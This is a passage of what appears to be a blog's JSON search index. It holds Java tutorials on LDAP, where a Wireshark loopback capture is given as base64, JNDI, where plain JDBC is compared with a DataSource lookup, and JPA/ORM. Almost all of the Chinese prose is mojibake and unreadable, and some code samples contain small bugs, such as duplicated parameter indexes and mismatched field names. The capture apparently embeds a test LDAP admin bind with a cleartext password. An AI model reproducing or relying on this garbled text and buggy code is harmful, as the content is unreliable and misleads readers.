sbu.append((int)c); System.out.println(sbu.toString()); return sbu.toString(); } /** * è·å–æ—¶é—´æˆ³ * @return */ public static long getNowTimeStamp() { long time = System.currentTimeMillis(); time = time / 1000; return time; } } ä½¿ç”¨Wiresharkç›‘å¬æœ¬åœ°å›ç¯æµé‡ï¼ŒæŒ‡å®štcp.port=389\næ‰¾åˆ°åè®®ä¸ºLDAPçš„ç¬¬ä¸€ä¸ªæµé‡ï¼Œå³é”®è¯¥é¡¹-\u0026gt;è·Ÿè¸ªæµ-\u0026gt;TCP Streamï¼Œå¾—åˆ°å¦‚ä¸‹\næ¥ä¸‹æ¥å°±å¯ä»¥æ ¹æ®å…´è¶£å»ç ”ç©¶LDAPåè®®äº†\nå¦‚ä¸‹æ˜¯æˆ‘æµé‡åŒ…çš„base64ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥æ‹¿æ¥è§£ç åä¿å­˜ä¸º.pcapæ–‡ä»¶ç ”ç©¶\nè§£å‹æ–¹æ³•ï¼šecho \u0026quot;1M....+SiYAAA=\u0026quot;|base64 -d \u0026gt; LDAP.pcap\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 1MOyoQIABAAAAAAAAAAAAAAABAAAAAAAa8RFZ/PgCAA4AAAAOAAAAAIAAABFAAA0TwRAAIAGAAB/ AAABfwAAAQi1AYXkU/U2AAAAAIAC//+TJQAAAgT/1wEDAwgBAQQCa8RFZyfhCAA4AAAAOAAAAAIA AABFAAA0TwdAAIAGAAB/AAABfwAAAQGFCLUCKHpG5FP1N4AS//8WpgAAAgT/1wEDAwgBAQQCa8RF Z0fhCAAsAAAALAAAAAIAAABFAAAoTwhAAIAGAAB/AAABfwAAAQi1AYXkU/U3Aih6R1AQJ/kppAAA a8RFZyvjCABdAAAAXQAAAAIAAABFAABZTwlAAIAGAAB/AAABfwAAAQi1AYXkU/U3Aih6R1AYJ/l9 MgAAMC8CAQFgKgIBAwQbY249YWRtaW4sZGM9Z3N5bWdzeW0sZGM9Y29tgAhBYTEyMytCYmvERWdG 4wgALAAAACwAAAACAAAARQAAKE8KQACABgAAfwAAAX8AAAEBhQi1Aih6R+RT9WhQECf5KXMAAGvE RWex5wgAOgAAADoAAAACAAAARQAANk8LQACABgAAfwAAAX8AAAEBhQi1Aih6R+RT9WhQGCf55eQA ADAMAgEBYQcKAQAEAAQAa8RFZ8rnCAAsAAAALAAAAAIAAABFAAAoTwxAAIAGAAB/AAABfwAAAQi1 AYXkU/VoAih6VVAQJ/kpZQAAa8RFZ0PqCADFAAAAxQAAAAIAAABFAADBTw1AAIAGAAB/AAABfwAA AQi1AYXkU/VoAih6VVAYJ/kf0AAAMIGWAgECY3QEEmRjPWdzeW1nc3ltLGRjPWNvbQoBAgoBAwIB AAIBAAEBAKAShwtvYmplY3RDbGFzc4cDdWlkMDsEA3VpZAQMdXNlclBhc3N3b3JkBAtkaXNwbGF5 TmFtZQQCY24EAnNuBARtYWlsBAtkZXNjcmlwdGlvbqAbMBkEFzIuMTYuODQwLjEuMTEzNzMwLjMu NC4ya8RFZ1/qCAAsAAAALAAAAAIAAABFAAAoTw5AAIAGAAB/AAABfwAAAQGFCLUCKHpV5FP2AVAQ J/gozQAAa8RFZ7ftCAA6AAAAOgAAAAIAAABFAAA2Tw9AAIAGAAB/AAABfwAAAQGFCLUCKHpV5FP2 AVAYJ/jkOgAAMAwCAQJlBwoBAAQABABrxEVn2O0IACwAAAAsAAAAAgAAAEUAAChPEEAAgAYAAH8A AAF/AAABCLUBheRT9gECKHpjUBAn+Si+AABrxEVny+4IAFAAAABQAAAAAgAAAEUAAExPEUAAgAYA AH8AAAF/AAABCLUBheRT9gECKHpjUBgn+YcEAAAwIgIBA0IAoBswGQQXMi4xNi44NDAuMS4xMTM3 MzAuMy40LjJrxEVn4e4IACwAAAAsAAAAAgAAAEUAAChPEkAAgAYAAH8AAAF/AAABAYUItQIoemPk U/YlUBAn+CibAABrxEVnQ+8IACwAAAAsAAAAAgAAAEUAAChPE0AAgAYAAH8AAAF/AAABCLUBheRT 9iUCKHpjUBEn+SiZAABrxEVnU+8IACwAAAAsAAAAAgAAAEUAAChPFEAAgAYAAH8AAAF/AAABAYUI tQIoemPkU/YmUBAn+CiaAABrxEVndvIIACwAAAAsAAAAAgAAAEUAAChPFUAAgAYAAH8AAAF/AAAB AYUItQIoemPkU/YmUBEn+CiZAABrxEVnnvIIACwAAAAsAAAAAgAAAEUAAChPFkAAgAYAAH8AAAF/ AAABCLUBheRT9iYCKHpkUBAn+SiYAAA= Ref https://blog.csdn.net/zou8944/article/details/122287398\nhttps://blog.csdn.net/pushiqiang/article/details/119982651\nhttps://www.cnblogs.com/siyunianhua/p/18309700\nhttps://zhuanlan.zhihu.com/p/32732045\nhttps://blog.csdn.net/ysf15609260848/article/details/126002321\nhttps://blog.csdn.net/ysf15609260848/article/details/126002452\n","date":"2024-11-25T08:05:08+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241125100106320.png","permalink":"https://d4n-sec.github.io/p/javaaboutldap/","title":"JavaåŸºç¡€çŸ¥è¯†ï¼šLDAP"},{"content":"OKï¼Œåˆåˆ°äº†å–œé—»ä¹è§çš„JavaåŸºç¡€çŸ¥è¯†ç¯èŠ‚\nWhat\u0026rsquo;s JNDI JNDIï¼Œå³Java Naming and Directory Interfaceï¼Œç›´è¯‘ä¸º Javaå‘½åä¸ç›®å½•æ¥å£\nJavaè¡¨æ˜äº†è¿™ä¸ªç©æ„å„¿å¤§æ¦‚ç‡åªåœ¨Javaä¸­å­˜åœ¨\nInterfaceè¡¨æ˜äº†è¿™ä¸ªç©æ„å„¿æ˜¯ä¸€ä¸ª Interfaceï¼ˆæ¥å£ï¼‰ï¼ŒInterface çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿæ¨¡æ‹Ÿä¸€ç§è§„èŒƒ\nNaming and Directoryè¿™ä¸ªçš„ç›´è¯‘å…¶å®æœ‰äº›ä¸å¯¹ï¼ŒNamingç¡®å®æ˜¯å‘½åï¼Œä½†æ˜¯è‹±æ–‡ä¸­çš„Directoryå…¶å®æ›´åå‘äºç”µè¯ç°¿ï¼Œåœ°å€ç°¿ç±»ä¼¼çš„ä¸œè¥¿\nJNDIè¿™é‡Œæœ€é‡è¦çš„æ¦‚å¿µæ˜¯Naming and Directoryï¼Œæœ€é‡è¦çš„å®šä½æ˜¯Interface\nå¯èƒ½å¾ˆå•°å—¦ï¼Œä½†æ˜¯è¿™å°±æ˜¯ä»–æœ€åŸå§‹ï¼Œä¹Ÿæ˜¯æœ€æœ¬è´¨çš„å®šä¹‰ï¼Œå¦‚æœä½ æƒ³çŸ¥é“ä»–æ˜¯ä»€ä¹ˆï¼Œå°±æ˜¯Interfaceï¼Œç”¨æ¥å¹²ä»€ä¹ˆï¼Œå°±æ˜¯Naming and Directory\nHow to use JNDI ç½‘ä¸Šä¼šæœ‰å¾ˆå¤šæ —å­ï¼Œæ¥è§£é‡Šï¼Œæˆ–è€…å¸¦äººæ¥æ„Ÿå—JNDIçš„ä½¿ç”¨\nè¿™é‡Œä¹Ÿè´´å‡ºæ¥ï¼Œè¯»è€…å¯ä»¥æ„Ÿå—æ„Ÿå—\nNon-JNDI æœ¬æ —å­é€šä¿—çš„è®²å°±æ˜¯ï¼šä½¿ç”¨JDBCæ¥è¿æ¥æ•°æ®åº“å’Œæ‰§è¡ŒSQLè¯­å¥ï¼Œå®ƒæœ€å¤§çš„ç‰¹ç‚¹æ˜¯é€šè¿‡javaç¨‹åºå»æ‰¾æ•°æ®åº“é©±åŠ¨ï¼Œç„¶åæ¥è¿æ¥æ•°æ®åº“ã€‚\næ˜¯javaäº²è‡ªå»è¿æ•°æ®åº“ã€‚\nä»£ç å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Connection conn=null; try { Class.forName(\u0026#34;com.mysql.jdbc.Driver\u0026#34;, true, Thread.currentThread().getContextClassLoader()); conn=DriverManager.getConnection(\u0026#34;jdbc:mysql://MyDBServer?user=xxx\u0026amp;password=xxx\u0026#34;); ...... conn.close(); } catch(Exception e) { e.printStackTrace(); } finally { if(conn!=null) { try { conn.close(); } catch(SQLException e) {} } } è¿™æ˜¯ä¼ ç»Ÿæ´¾çš„åšæ³•ï¼Œä¹Ÿæ˜¯ä»¥å‰éJavaç¨‹åºå‘˜ï¼ˆå¦‚Delphiã€VBç­‰ï¼‰å¸¸è§çš„åšæ³•ã€‚è¿™ç§åšæ³•ä¸€èˆ¬åœ¨å°è§„æ¨¡çš„å¼€å‘è¿‡ç¨‹ä¸­ä¸ä¼šäº§ç”Ÿé—®é¢˜ï¼Œåªè¦ç¨‹åºå‘˜ç†Ÿæ‚‰Javaè¯­è¨€ã€äº†è§£JDBCæŠ€æœ¯å’ŒMySQLï¼Œå¯ä»¥å¾ˆå¿«å¼€å‘å‡ºç›¸åº”çš„åº”ç”¨ç¨‹åºã€‚\næ²¡æœ‰JNDIçš„åšæ³•å­˜åœ¨çš„é—®é¢˜ï¼š\n1ã€æ•°æ®åº“æœåŠ¡å™¨åç§°MyDBServer ã€ç”¨æˆ·åå’Œå£ä»¤éƒ½å¯èƒ½éœ€è¦æ”¹å˜ï¼Œç”±æ­¤å¼•å‘JDBC URLéœ€è¦ä¿®æ”¹ï¼›\n2ã€æ•°æ®åº“å¯èƒ½æ”¹ç”¨åˆ«çš„äº§å“ï¼Œå¦‚æ”¹ç”¨DB2æˆ–è€…Oracleï¼Œå¼•å‘JDBCé©±åŠ¨ç¨‹åºåŒ…å’Œç±»åéœ€è¦ä¿®æ”¹ï¼›\n3ã€éšç€å®é™…ä½¿ç”¨ç»ˆç«¯çš„å¢åŠ ï¼ŒåŸé…ç½®çš„è¿æ¥æ± å‚æ•°å¯èƒ½éœ€è¦è°ƒæ•´ï¼›\n4ã€\u0026hellip;\u0026hellip;\nç¨‹åºå‘˜åº”è¯¥ä¸éœ€è¦å…³å¿ƒâ€œå…·ä½“çš„æ•°æ®åº“åå°æ˜¯ä»€ä¹ˆï¼ŸJDBCé©±åŠ¨ç¨‹åºæ˜¯ä»€ä¹ˆï¼ŸJDBC URLæ ¼å¼æ˜¯ä»€ä¹ˆï¼Ÿè®¿é—®æ•°æ®åº“çš„ç”¨æˆ·åå’Œå£ä»¤æ˜¯ä»€ä¹ˆï¼Ÿâ€ç­‰ç­‰è¿™äº›é—®é¢˜ï¼Œç¨‹åºå‘˜ç¼–å†™çš„ç¨‹åºåº”è¯¥æ²¡æœ‰å¯¹ JDBC é©±åŠ¨ç¨‹åºçš„å¼•ç”¨ï¼Œæ²¡æœ‰æœåŠ¡å™¨åç§°ï¼Œæ²¡æœ‰ç”¨æˆ·åç§°æˆ–å£ä»¤ â€”â€” ç”šè‡³æ²¡æœ‰æ•°æ®åº“æ± æˆ–è¿æ¥ç®¡ç†ã€‚è€Œæ˜¯æŠŠè¿™äº›é—®é¢˜äº¤ç»™J2EEå®¹å™¨æ¥é…ç½®å’Œç®¡ç†ï¼Œç¨‹åºå‘˜åªéœ€è¦å¯¹è¿™äº›é…ç½®å’Œç®¡ç†è¿›è¡Œå¼•ç”¨å³å¯ã€‚\nWith-JNDI ç”¨äº†JNDIä¹‹åçš„åšæ³•ï¼š\né¦–å…ˆï¼Œåœ¨åœ¨J2EEå®¹å™¨ä¸­é…ç½®JNDIå‚æ•°ï¼Œå®šä¹‰ä¸€ä¸ªèµ„æºæºï¼ˆåœ¨è¿™é‡Œæ˜¯æ•°æ®æºï¼‰ç»™è¿™ä¸ªæ•°æ®æºè®¾ç½®ä¸€ä¸ªåç§°ï¼ˆè®°ä½ï¼Œåé¢è¦è€ƒï¼‰\nç„¶åï¼Œåœ¨ç¨‹åºä¸­ï¼Œé€šè¿‡æ•°æ®æºåç§°å¼•ç”¨æ•°æ®æºä»è€Œè®¿é—®åå°æ•°æ®åº“ã€‚\nå…·ä½“æ“ä½œå¦‚ä¸‹ï¼Œä»¥JBossä¸ºä¾‹ï¼ˆä¹Ÿå¯ä»¥Tomcatï¼Œé…ç½®åˆ°Tomcatçš„context.xmlï¼‰\nåœ¨JBossçš„ D:/jboss420GA/docs/examples/jca æ–‡ä»¶å¤¹ä¸‹é¢ï¼Œæœ‰å¾ˆå¤šä¸åŒæ•°æ®åº“å¼•ç”¨çš„æ•°æ®æºå®šä¹‰æ¨¡æ¿ã€‚å°†å…¶ä¸­çš„ mysql-ds.xml æ–‡ä»¶Copyåˆ°ä½ ä½¿ç”¨çš„æœåŠ¡å™¨ä¸‹ï¼Œå¦‚ D:/jboss420GA/server/default/deployã€‚ ä¿®æ”¹ mysql-ds.xml æ–‡ä»¶çš„å†…å®¹ï¼Œä½¿JBOSSèƒ½æ ¹æ®é…ç½®é€šè¿‡JDBCæ­£ç¡®è®¿é—®ä½ çš„MySQLæ•°æ®åº“\næ²¡é”™ï¼Œè¿™ä¸€æ­¥åº”è¯¥æ˜¯JBOSSæ¥è¿æ¥è€Œéjavaç¨‹åº\nä¸ºä»€ä¹ˆæ˜¯åº”è¯¥ï¼Œç¬”è€…å’©æœ‰å®éªŒå˜ï¼Œæ ¹æ®ä¼—å¤šæ–‡ç« çš„ç†è§£æ˜¯è¿™æ ·\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 Connection conn=null; try { Context ctx = new InitialContext(); Object datasourceRef = ctx.lookup(\u0026#34;java:MySqlDS\u0026#34;); //è¯¥è¡Œæ˜¯é‡ç‚¹å…³æ³¨è¡Œ //å¼•ç”¨æ•°æ®æº DataSource ds = (Datasource) datasourceRef; conn = ds.getConnection(); ...... c.close(); } catch(Exception e) { e.printStackTrace(); } finally { if(conn!=null) { try { conn.close(); } catch(SQLException e) {} } } Benefits of With-JNDI ç›´æ¥ä½¿ç”¨JDBCæˆ–è€…é€šè¿‡JNDIå¼•ç”¨æ•°æ®æºçš„ç¼–ç¨‹ä»£ç é‡ç›¸å·®æ— å‡ ï¼Œä½†æ˜¯ç°åœ¨çš„ç¨‹åºå¯ä»¥ä¸ç”¨å…³å¿ƒå…·ä½“JDBCå‚æ•°äº†ã€‚\nåœ¨ç³»ç»Ÿéƒ¨ç½²åï¼Œå¦‚æœæ•°æ®åº“çš„ç›¸å…³å‚æ•°å˜æ›´ï¼Œåªéœ€è¦é‡æ–°é…ç½® mysql-ds.xml ä¿®æ”¹å…¶ä¸­çš„JDBCå‚æ•°ï¼Œåªè¦ä¿è¯æ•°æ®æºçš„åç§°ä¸å˜ï¼Œé‚£ä¹ˆç¨‹åºæºä»£ç å°±æ— éœ€ä¿®æ”¹ã€‚\nç”±æ­¤å¯è§ï¼ŒJNDIé¿å…äº†ç¨‹åºä¸æ•°æ®åº“ä¹‹é—´çš„ç´§è€¦åˆï¼Œä½¿åº”ç”¨æ›´åŠ æ˜“äºé…ç½®ã€æ˜“äºéƒ¨ç½²ã€‚\nRe-understand the JNDI æ ¸å¿ƒç‚¹æ˜¯ï¼šæŠŠèµ„æºå–ä¸ªåå­—ï¼Œå†æ ¹æ®åå­—æ¥æ‰¾èµ„æº\nå¦‚ä½•ç»™èµ„æºå–åå­—ï¼Ÿé€šè¿‡é…ç½®æ–‡ä»¶ï¼Œé€šè¿‡RMIï¼ŒWhatever.\né‡ç‚¹æ˜¯ä»€ä¹ˆï¼Ÿæ˜¯ç»™å½“å‰åº”ç”¨æœåŠ¡å™¨æ‰€ç®¡ç†çš„æ‰€æœ‰èµ„æºä¸€ä¸ªå”¯ä¸€çš„æ ‡è¯†ï¼Œèµ„æºå¯ä»¥åŒ…æ‹¬åŒ…æ‹¬æ•°æ®åº“ï¼Œç½‘é¡µï¼Œæ–‡ä»¶ï¼Œè¿æ¥æ± ç­‰ç­‰ã€‚\nJNDIæä¾›äº†ä¸€ç§ç»Ÿä¸€çš„æ–¹å¼ï¼Œå¯ä»¥ç”¨åœ¨ç½‘ç»œä¸ŠæŸ¥æ‰¾å’Œè®¿é—®æœåŠ¡ã€‚é€šè¿‡æŒ‡å®šä¸€ä¸ªèµ„æºåç§°ï¼Œè¯¥åç§°å¯¹åº”äºæ•°æ®åº“æˆ–å‘½åæœåŠ¡ä¸­çš„ä¸€ä¸ªè®°å½•ï¼ŒåŒæ—¶è¿”å›ç›¸å…³æœåŠ¡æ‰€å¿…é¡»çš„ä¿¡æ¯ã€‚\nJNDIä¸»è¦æœ‰ä¸¤éƒ¨åˆ†ç»„æˆï¼šåº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£å’ŒæœåŠ¡ä¾›åº”å•†æ¥å£ã€‚\nåº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£æä¾›äº†Javaåº”ç”¨ç¨‹åºè®¿é—®å„ç§å‘½åå’Œç›®å½•æœåŠ¡çš„åŠŸèƒ½ æœåŠ¡ä¾›åº”å•†æ¥å£æä¾›äº†ä»»æ„ä¸€ç§æœåŠ¡çš„ä¾›åº”å•†ä½¿ç”¨çš„åŠŸèƒ½ã€‚ ï¼ï¼ï¼ï¼\nJNDIï¼ˆJava Name Directory Interfaceï¼‰æ˜¯ä¸ºåº”ç”¨æœåŠ¡å™¨ç®¡ç†èµ„æºæ‰€è®¾ç½®çš„ç›®å½•æ ·å¼çš„å”¯ä¸€æ ‡è¯†ï¼ˆå°±åƒæ˜¯ç”µè¯ç°¿ä¸€æ ·ï¼‰ï¼Œæ•°æ®åº“ã€ç½‘é¡µã€æ–‡æ¡£ç­‰\nï¼ï¼ï¼ï¼\nRef https://blog.csdn.net/belongtocode/article/details/106327415\nhttps://blog.csdn.net/wn084/article/details/80729230\nhttps://blog.csdn.net/ibigboy/article/details/84309064\nhttps://blog.csdn.net/ibigboy/article/details/84308580\nhttps://www.cnblogs.com/dion-90/articles/9029581.html\n\u0026mdash;TODO\u0026mdash; JNDI Tomcat æˆ–è€… JBOSS é…ç½®åï¼Œè·Ÿè¸ªç¨‹åºæµï¼ŒæŸ¥çœ‹æ˜¯å¦æ˜¯ç”±Tomcat/JBOSSè¿›è¡Œæ•°æ®åº“è¿æ¥\n","date":"2024-11-23T10:04:22+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241121100840910.png","permalink":"https://d4n-sec.github.io/p/javaaboutjndi/","title":"JavaåŸºç¡€çŸ¥è¯†ï¼šJNDI"},{"content":"\nWhat\u0026rsquo;s JPA JPAï¼ˆJakarta Persistence APIï¼‰æ˜¯ä¸€ä¸ªè§„èŒƒï¼Œå®šä¹‰äº†Javaåº”ç”¨ç¨‹åºä¸­æŒä¹…æ€§çš„ä¸€ç»„æ¦‚å¿µã€‚JPAæä¾›äº†ä¸€ä¸ªå¯¹è±¡å…³ç³»æ˜ å°„ï¼ˆORMï¼‰å±‚ï¼Œå…è®¸å¼€å‘äººå‘˜ä½¿ç”¨Javaå¯¹è±¡è¿›è¡Œå·¥ä½œï¼Œè€Œæ— éœ€æ‰‹åŠ¨è½¬æ¢å¯¹è±¡å¯¼å‘èŒƒå¼å’Œå…³ç³»æ•°æ®åº“ä¹‹é—´çš„å·®å¼‚ã€‚JPAå®ç°å¦‚Hibernateå’ŒEclipseLinkå¤„ç†Javaå¯¹è±¡å’Œæ•°æ®åº“è¡¨ä¹‹é—´çš„è½¬æ¢ï¼Œä½¿å¼€å‘äººå‘˜å…äºç¼–å†™åº•å±‚JDBCä»£ç ã€‚\nWhat\u0026rsquo;s ORM ORMæ˜¯ä¸€é¡¹ä»»åŠ¡ - å¼€å‘äººå‘˜æœ‰å¾ˆå¥½çš„ç†ç”±æ‰‹åŠ¨é¿å…æ‰§è¡Œè¿™é¡¹ä»»åŠ¡ã€‚\nåƒHibernateæˆ–EclipseLinkè¿™æ ·çš„æ¡†æ¶å°†è¯¥ä»»åŠ¡ç¼–çº‚ä¸ºä¸€ä¸ªåº“æˆ–æ¡†æ¶ï¼Œè¿™å°±æ˜¯ORMå±‚ã€‚ä½œä¸ºåº”ç”¨ç¨‹åºæ¶æ„çš„ä¸€éƒ¨åˆ†ï¼ŒORMå±‚è´Ÿè´£ç®¡ç†è½¯ä»¶å¯¹è±¡ä¸å…³ç³»æ•°æ®åº“ä¸­çš„è¡¨å’Œåˆ—ä¹‹é—´çš„è½¬æ¢ã€‚\nåœ¨Javaä¸­ï¼ŒORMå±‚å°†Javaç±»å’Œå¯¹è±¡è½¬æ¢ä¸ºå¯ä»¥å­˜å‚¨å’Œç®¡ç†åœ¨å…³ç³»æ•°æ®åº“ä¸­çš„å½¢å¼ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¢«æŒä¹…åŒ–çš„å¯¹è±¡çš„åç§°æˆä¸ºè¡¨çš„åç§°ï¼Œå­—æ®µæˆä¸ºåˆ—ã€‚ä¸€æ—¦è¡¨è®¾ç½®å¥½ï¼Œæ¯ä¸ªè¡¨è¡Œéƒ½å¯¹åº”äºåº”ç”¨ç¨‹åºä¸­çš„ä¸€ä¸ªå¯¹è±¡ã€‚\nSummary of ORM ORMæ˜¯ä¸€ç§å°†é¢å‘å¯¹è±¡çš„æ•°æ®æ¨¡å‹æ˜ å°„åˆ°å…³ç³»æ•°æ®åº“æ¨¡å‹çš„æŠ€æœ¯ã€‚\nORMå±‚æ˜¯å®ç°è¿™ç§æ˜ å°„çš„æ¡†æ¶æˆ–åº“ï¼Œå®ƒè´Ÿè´£åœ¨åº”ç”¨ç¨‹åºä»£ç å’Œæ•°æ®åº“ä¹‹é—´è¿›è¡Œè½¬æ¢ï¼Œä½¿å¼€å‘äººå‘˜æ— éœ€æ‰‹åŠ¨ç¼–å†™JDBCä»£ç ã€‚\nä¸‹å›¾è¯´æ˜äº†JPAå’ŒORMå±‚åœ¨åº”ç”¨ç¨‹åºå¼€å‘ä¸­çš„ä½œç”¨ã€‚\nHow to Do ä½¿ç”¨ä¸€ä¸ªæ —å­æ¥æ„Ÿå—ä¸€ä¸‹ï¼Œä¸ä½¿ç”¨JPAå’Œä½¿ç”¨JPAçš„å·®å¼‚\nå®šä¹‰ä¸€ä¸ªç®€å•çš„æ•°æ® Java ç±» Musician\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class Musician { private Long id; private String name; private Instrument mainInstrument; private ArrayList performances = new ArrayList(); public Musician( Long id, String name){ /* constructor setters... */ } public void setName(String name){ this.name = name; } public String getName(){ return this.name; } public void setMainInstrument(Instrument instr){ this.instrument = instr; } public Instrument getMainInstrument(){ return this.instrument; } // ...Other getters and setters... } Musicianç±»ç”¨äºä¿å­˜æ•°æ®ã€‚å®ƒå¯ä»¥åŒ…å«è¯¸å¦‚åç§°å­—æ®µä¹‹ç±»çš„åŸºæœ¬æ•°æ®ç±»å‹ï¼Œä¹Ÿå¯ä»¥åŒ…å«å¯¹å…¶ä»–ç±»(å¦‚Instrumentå’ŒArrayList)å¯¹è±¡çš„å¼•ç”¨å…³ç³»ã€‚\nMusicianç±»çš„ä¸»è¦ç›®çš„æ˜¯ä¿å­˜æ•°æ®ã€‚\nè¿™ç§ç±»å‹çš„ç±»æœ‰æ—¶è¢«ç§°ä¸ºDTO(æ•°æ®ä¼ è¾“å¯¹è±¡)ã€‚DTOæ˜¯è½¯ä»¶å¼€å‘ä¸­çš„ä¸€ä¸ªå¸¸è§ç‰¹å¾ã€‚å®ƒä»¬å¯ä»¥ä¿å­˜å„ç§ç±»å‹çš„æ•°æ®ï¼Œä½†ä¸åŒ…å«ä»»ä½•ä¸šåŠ¡é€»è¾‘ã€‚\nNon-JPA è¿™æ—¶å€™ï¼Œå¦‚æœè¦å»æŸ¥è¯¢æˆ–è€…æ“ä½œæ•°æ®åº“ï¼Œä»£ç åº”è¯¥å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 Musician georgeHarrison = new Musician(0, \u0026#34;George Harrison\u0026#34;); String myDriver = \u0026#34;org.gjt.mm.mysql.Driver\u0026#34;; String myUrl = \u0026#34;jdbc:mysql://localhost/test\u0026#34;; Class.forName(myDriver); Connection conn = DriverManager.getConnection(myUrl, \u0026#34;root\u0026#34;, \u0026#34;\u0026#34;); String query = \u0026#34; insert into users (id, name) values (?, ?)\u0026#34;; PreparedStatement preparedStmt = conn.prepareStatement(query); preparedStmt.setInt (1, 0); preparedStmt.setString (2, \u0026#34;George Harrison\u0026#34;); preparedStmt.setString (2, \u0026#34;Rubble\u0026#34;); preparedStmt.execute(); conn.close(); // çœç•¥é”™è¯¯å¤„ç†ä»£ç  ä¸Šæ–¹ä»£ç å’Œä¸šåŠ¡åœºæ™¯è€¦åˆåº¦ç›¸å½“é«˜ã€‚georgeHarrisonå¯¹è±¡å¯ä»¥æ¥è‡ªä»»ä½•åœ°æ–¹(å‰ç«¯æäº¤ã€å¤–éƒ¨æœåŠ¡ç­‰),å¹¶ä¸”å…¶IDå’Œåç§°å­—æ®µå·²è®¾ç½®ã€‚å¯¹è±¡ä¸Šçš„å­—æ®µç”¨äºæä¾›SQLæ’å…¥è¯­å¥çš„å€¼ã€‚(PreparedStatementç±»æ˜¯JDBCçš„ä¸€éƒ¨åˆ†,æä¾›äº†ä¸€ç§å®‰å…¨åœ°å°†å€¼åº”ç”¨äºSQLæŸ¥è¯¢çš„æ–¹æ³•ã€‚)\nè™½ç„¶JDBCæä¾›äº†æ‰‹åŠ¨é…ç½®æ‰€å¸¦æ¥çš„å¯æ§æ€§ï¼Œä½†ä¸JPAç›¸æ¯”å®ƒæ›´åŠ ç¹çã€‚è¦ä¿®æ”¹æ•°æ®åº“ï¼Œæ‚¨é¦–å…ˆéœ€è¦åˆ›å»ºä¸€ä¸ªSQLæŸ¥è¯¢ï¼Œå°†Javaå¯¹è±¡æ˜ å°„åˆ°å…³ç³»æ•°æ®åº“ä¸­çš„è¡¨ã€‚æ‚¨éšåè¿˜éœ€è¦åœ¨å¯¹è±¡ç­¾åå‘ç”Ÿå˜åŒ–æ—¶ä¿®æ”¹SQLã€‚ä½¿ç”¨JDBCï¼Œç»´æŠ¤SQLæœ¬èº«å°±æˆä¸ºç¨‹åºå‘˜çš„ä¸€é¡¹ä»»åŠ¡ï¼Œè€Œè¿™ä¸ªä¸ä¸šåŠ¡é€»è¾‘ç›¸è·ç”šè¿œã€‚\nUse-JPA 1 2 Musician georgeHarrison = new Musician(0, \u0026#34;George Harrison\u0026#34;); musicianManager.save(georgeHarrison); æ‰‹åŠ¨SQLæ›¿æ¢ä¸ºå•è¡Œä»£ç entityManager.save()ï¼Œè¿™ä¼šå‘Šè¯‰JPAéœ€è¦æŒä¹…åŒ–è¯¥å¯¹è±¡ã€‚ä»æ­¤ä»¥åï¼Œæ¡†æ¶ä¼šå¤„ç†SQLè½¬æ¢ã€‚\nå› æ­¤ç¨‹åºå‘˜æ— éœ€ç¦»å¼€é¢å‘å¯¹è±¡ç¼–ç¨‹çš„èŒƒå›´ã€‚\nSupplementary Java Data Objects Java Data Objects (JDO)æ˜¯ä¸€ä¸ªæ ‡å‡†åŒ–çš„æŒä¹…æ€§æ¡†æ¶ï¼Œå®ƒä¸JPAçš„ä¸»è¦åŒºåˆ«åœ¨äºåœ¨å¯¹è±¡ä¸­æ”¯æŒæŒä¹…æ€§é€»è¾‘ï¼Œä»¥åŠå®ƒé•¿æœŸä»¥æ¥å¯¹éå…³ç³»æ•°æ®å­˜å‚¨çš„æ”¯æŒã€‚ JPAå’ŒJDOè¶³å¤Ÿç›¸ä¼¼ï¼Œä»¥è‡³äºJDOæä¾›ç¨‹åºé€šå¸¸ä¹Ÿæ”¯æŒJPAã€‚ è¯·è®¿é—® Apache JDO Project äº†è§£æ›´å¤šå…³äºJDOä¸JPAå’ŒJDBCç­‰å…¶ä»–æŒä¹…æ€§æ ‡å‡†çš„ä¿¡æ¯ã€‚\nOther Articles JPAï¼ˆJava Persistence APIï¼‰æ˜¯ Java æ ‡å‡†ä¸­çš„ä¸€å¥—ORMè§„èŒƒ\næä¾›äº†ä¸€äº›ç¼–ç¨‹çš„ API æ¥å£ï¼Œå…·ä½“å®ç°ç”± ORM å‚å•†å®ç°ï¼Œå¦‚Hiernateã€TopLink ã€Eclipselinkç­‰éƒ½æ˜¯ JPA çš„å…·ä½“å®ç°\nå€ŸåŠ© JPA æŠ€æœ¯å¯ä»¥é€šè¿‡æ³¨è§£æˆ–è€…XMLæè¿°ã€å¯¹è±¡-å…³ç³»è¡¨ã€‘ä¹‹é—´çš„æ˜ å°„å…³ç³»ï¼Œå¹¶å°†å®ä½“å¯¹è±¡æŒä¹…åŒ–åˆ°æ•°æ®åº“ä¸­ï¼ˆå³Object Modelä¸Data Modelé—´çš„æ˜ å°„ï¼‰ã€‚\nJPAæ˜¯JavaæŒä¹…å±‚APIï¼Œç”±Sunå…¬å¸å¼€å‘ï¼Œå¸Œæœ›è§„èŒƒã€ç®€åŒ–Javaå¯¹è±¡çš„æŒä¹…åŒ–å·¥ä½œï¼Œæ•´åˆORMæŠ€æœ¯ï¼Œæ•´åˆç¬¬ä¸‰æ–¹ORMæ¡†æ¶ï¼Œå»ºç«‹ä¸€ç§æ ‡å‡†çš„æ–¹å¼ï¼Œç›®å‰ä¹Ÿæ˜¯åœ¨æŒ‰ç…§è¿™ä¸ªæ–¹å‘å‘å±•ï¼Œä½†æ˜¯è¿˜æ²¡èƒ½å®Œå…¨å®ç°ã€‚åœ¨ORMæ¡†æ¶ä¸­ï¼ŒHibernateæ¡†æ¶åšäº†è¾ƒå¥½çš„ JPA å®ç°ï¼Œå·²è·å¾—Sunçš„å…¼å®¹è®¤è¯ã€‚\nJPA çš„ä¼˜åŠ¿ï¼š\nå¼€å‘è€…é¢å‘ JPA 